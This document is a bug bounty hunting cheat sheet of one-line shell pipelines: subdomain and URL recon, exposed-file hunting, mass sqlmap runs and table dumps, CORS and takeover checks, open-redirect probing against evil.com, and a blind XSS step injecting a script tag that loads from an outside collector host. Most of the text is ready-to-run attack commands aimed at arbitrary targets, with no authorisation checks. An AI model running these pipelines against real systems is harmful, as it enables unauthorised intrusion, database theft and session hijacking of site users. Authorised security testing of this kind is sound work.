<h1>My Bug Bounty Hunting Methodology</h1>

<h1>Recon</h1>


```bash
subfinder -d target.com -all  -recursive > subdomain.txt
```

```bash

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

```bash

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

```bash

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
```

```bash

cat allurls.txt | grep -E "\.js$" >> js.txt
```

```bash

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
```

```bash

echo target.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
```

```bash

dirsearch  -u https://www.target.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
```

```bash

subfinder -d target.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
```

```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

```bash

python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```


```bash

nuclei  -list subdomains_alive.txt -tags cves,osint,tech
```

```bash

cat allurls.txt | gf lfi | nuclei -tags lfi
```

```bash
cat allurls.txt | gf redirect | openredirex -p /home/vulncrax/openRedirect
```
<h1>Sqli</h1>

```bash
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)
```

```bash
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
```

```bash
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
```

```bash
sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users
```


<h1>SQLi One Linear :</h1>

```bash
cat target.txt | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```

```bash
subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```


<h1>Testing for xss and sqli at the same time :</h1>

```bash
cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
```

```bash
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

```

```bash
cat param.txt | kxss
```

<h1>Running Nuclei :-</h1>

```bash
nuclei -u https://example.com
```

```bash
nuclei -list urls.txt -t /fuzzing-templates
```

```bash
nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
```

```bash
nuclei -u https://example.com -w workflows/
```

<h1>Open Redirect:-</h1>

```bash
waybackurls target.com | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```

```bash
httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

